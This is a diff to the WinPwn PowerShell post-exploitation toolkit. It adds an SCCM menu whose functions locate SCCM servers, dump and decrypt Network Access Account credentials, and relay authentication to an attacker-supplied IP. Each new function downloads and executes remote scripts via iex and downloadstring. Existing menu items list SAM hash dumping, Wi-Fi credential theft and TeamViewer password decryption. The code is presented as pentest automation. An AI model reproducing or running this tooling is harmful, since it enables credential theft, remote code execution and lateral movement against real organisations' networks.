@@ -631,8 +631,9 @@ __        ___       ____
             Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
           Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
           Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'
-    Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords!'
-          Write-Host -ForegroundColor Green '12. Go back '
+    Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords (Only Version <= 8!'
+    Write-Host -ForegroundColor Green '12. Dump and decrypt local SCCM NAA Credentials!'
+          Write-Host -ForegroundColor Green '13. Go back '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -649,9 +650,10 @@ __        ___       ____
             9{if(isadmin){samfile}}
       10{SharpCloud}
       11{decryptteamviewer}
+      12{SCCMDumpNAA}
              }
         }
-        While ($masterquestion -ne 12)
+        While ($masterquestion -ne 13)
 }
 
 
@@ -2281,7 +2283,8 @@ __        ___       ____
         Write-Host -ForegroundColor Green '25. Check the ADCS Templates for Privilege Escalation vulnerabilities via Certify!'
         Write-Host -ForegroundColor Green '26. Enumerate ADCS Template informations and permissions via Certify!'
         Write-Host -ForegroundColor Green '27. Check LDAP/LDAPS Signing and or Channel Binding'
-        Write-Host -ForegroundColor Green '28. Go back '
+        Write-Host -ForegroundColor Green '28. (Ab)use some SCCM stuff'
+        Write-Host -ForegroundColor Green '29. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2315,10 +2318,112 @@ __        ___       ____
          25{Invoke-VulnerableADCSTemplates}
          26{Invoke-ADCSTemplateRecon}
          27{LDAPChecksMenu}
+         28{SCCMMenu}
        }
     }
-  While ($masterquestion -ne 28)
+  While ($masterquestion -ne 29)
 }
+
+function SCCMMenu
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> SCCM Actions
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green "1. Locate the SCCM Server if used! "
+            Write-Host -ForegroundColor Green "2. Relay authentication from the SCCM server to your attacker system for Lateral Movement! "
+            Write-Host -ForegroundColor Green "3. Get NAA Credentials via @xpn technique (https://blog.xpnsec.com/unobfuscating-network-access-accounts/)! "
+            Write-Host -ForegroundColor Green "4. Dump and decrypt Network Access Account (NAA) credentials from the local SCCM client machine - needs local Admin (https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)! "
+            Write-Host -ForegroundColor Green '5. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{SCCMLocate}
+                2{SCCMForceAuth}
+                3{SCCMXPN}
+                4{SCCMDumpNAA}
+             }
+        }
+        While ($masterquestion -ne 5)
+
+}
+
+function SCCMLocate
+{
+
+    Param
+    (   
+        [Switch]
+        $consoleoutput
+    )
+    if(!$consoleoutput){pathcheck}
+
+    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-MalSCCM.ps1')
+    if(!$consoleoutput){$out = Invoke-MalSCCM locate; $out; $out >> "$currentPath\DomainRecon\SCCMServer.txt"}else{Invoke-MalSCCM locate}
+
+}
+
+function SCCMXPN
+{
+
+    Param
+    (   
+        [Switch]
+        $consoleoutput
+    )
+    if(!$consoleoutput){pathcheck}
+
+    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpSCCM.ps1')
+    if(!$consoleoutput){$out = Invoke-SharpSCCM -command "get naa -u WinPwn$ -p Aut0mat3S0mePentestT4sks!"; $out; $out >> "$currentPath\Exploitation\SCCMXpnCreds.txt"}else{Invoke-SharpSCCM -command "get naa -u WinPwn$ -p Aut0mat3S0mePentestT4sks!"}
+    Write-Host "Dont forget to cleanup and REMOVE the WinPwn$ Computer Account!!!!!!!!!"
+}
+
+function SCCMDumpNAA
+{
+
+    Param
+    (   
+        [Switch]
+        $consoleoutput
+    )
+    if(!$consoleoutput){pathcheck}
+    if (isadmin)
+    {
+        iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpSCCM.ps1')
+        if(!$consoleoutput){$out = Invoke-SharpSCCM -command "local naa wmi"; $out; $out >> "$currentPath\Exploitation\SCCM_naa_Creds.txt"}else{Invoke-SharpSCCM -command "local naa wmi"}
+    }
+    else
+    {
+        Write-Host "No elevated prompt, you need local Admin Privs!"
+    }
+}
+
+function SCCMForceAuth
+{
+    Param
+    (   
+        [Switch]
+        $consoleoutput
+    )
+    if(!$consoleoutput){pathcheck}
+    $serverName = Read-Host -Prompt "Please enter the SCCM Server Hostname/IP: "
+    $siteCode = Read-Host -Prompt "Please enter the SCCM Server Sitecode: "
+    $relayIP = Read-Host -Prompt "Please enter your attacker IP (e.G. where Responder/Ntlmrelayx.py is running): "
+    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpSCCM.ps1')
+    if(!$consoleoutput){$out = Invoke-SharpSCCM -command "$serverName $siteCode invoke client-push -t $relayIP"; $out >> "$currentPath\Exploitation\SCCMXpnCreds.txt"}else{Invoke-SharpSCCM -command "$serverName $siteCode invoke client-push -t $relayIP"}
+
+}
+
 
 function LDAPChecksMenu
 {
